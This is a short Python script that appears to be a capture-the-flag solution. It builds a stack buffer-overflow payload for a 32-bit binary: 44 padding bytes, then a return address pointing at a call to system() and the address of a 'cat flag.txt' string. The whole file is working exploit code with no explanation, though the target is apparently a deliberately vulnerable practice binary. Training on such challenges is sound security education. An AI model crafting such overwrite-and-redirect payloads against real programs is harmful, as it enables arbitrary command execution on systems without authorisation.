import struct

call_to_system = 0x08048657
cat_flagtxt = 0x804a030

p = "A"*44
p += struct.pack("I", call_to_system)
p += struct.pack("I", cat_flagtxt)

print(p)

